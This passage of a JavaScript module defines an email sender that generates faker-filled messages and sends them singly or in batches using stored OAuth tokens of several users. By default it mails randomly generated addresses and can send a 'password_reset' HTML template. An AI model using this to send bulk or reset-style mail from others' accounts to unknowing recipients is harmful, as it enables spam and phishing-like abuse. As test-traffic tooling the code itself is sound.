            content.push('');
            content.push(faker.lorem.sentences(sentences));
          } else if (i === paragraphs - 1) {
            content.push('');
            content.push(`Don't miss out on this limited-time offer!`);
            content.push('');
            content.push(`Best,`);
            content.push(`The ${faker.company.name()} Team`);
          } else {
            content.push('');
            content.push(faker.lorem.sentences(sentences));
          }
        }
        return content.join('\n');
      }
    };

    const templateFunc = templates[template] || templates.business;
    return templateFunc();
  }

  /**
   * Generate random recipient email addresses
   */
  generateRecipients(count = 1) {
    const recipients = [];
    for (let i = 0; i < count; i++) {
      recipients.push(faker.internet.email());
    }
    return recipients;
  }

  /**
   * Send a single email
   */
  async sendEmail(userKey, options = {}) {
    const {
      to,
      subject,
      body,
      template = 'business',
      length = 'medium',
      cc,
      bcc,
      saveToSentItems = true
    } = options;

    // Get valid access token
    const accessToken = await this.getValidToken(userKey);

    // Generate content if not provided
    const finalSubject = subject || this.generateSubject(template);
    const finalBody = body || this.generateBody(template, length);
    const finalTo = to || this.generateRecipients(1);

    console.log(`Sending email from ${userKey}:`);
    console.log(`  To: ${finalTo.join(', ')}`);
    console.log(`  Subject: ${finalSubject}`);
    console.log(`  Template: ${template}, Length: ${length}`);

    // Send the email - detect HTML content
    const isHtml = template === 'password_reset' || finalBody.includes('<html>') || finalBody.includes('<body>');
    const result = await sendMail(accessToken, {
      to: finalTo,
      cc,
      bcc,
      subject: finalSubject,
      ...(isHtml ? { bodyHtml: finalBody } : { bodyText: finalBody }),
      saveToSentItems
    });

    return {
      success: true,
      result,
      details: {
        to: finalTo,
        subject: finalSubject,
        template,
        length
      }
    };
  }

  /**
   * Send multiple emails in batch
   */
  async sendBatchEmails(userKey, count = 1, options = {}) {
    const results = [];
    const errors = [];

    for (let i = 0; i < count; i++) {
      try {
        const result = await this.sendEmail(userKey, {
          ...options,
          // Generate new recipients for each email if not specified
          to: options.to || this.generateRecipients(1)
        });
        results.push(result);

        // Small delay between emails to avoid rate limits
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      } catch (error) {
        console.error(`Failed to send email ${i + 1}:`, error.message);
        errors.push({
          index: i,
          error: error.message
        });
      }
    }

    return {
      total: count,
      successful: results.length,
      failed: errors.length,
      results,
      errors
    };
  }

  /**
   * List available user keys with tokens
   */
  async listAvailableUsers() {
    const users = await this.store.list();
    return users.map(user => ({
      userKey: user.user_key,
      email: user.user?.mail,
      displayName: user.user?.displayName,
      savedAt: user.saved_at,
      expiresAt: user.expires_at,
      scope: user.scope
    }));
  }
}

// Export a singleton instance
export const emailSender = new EmailSender();
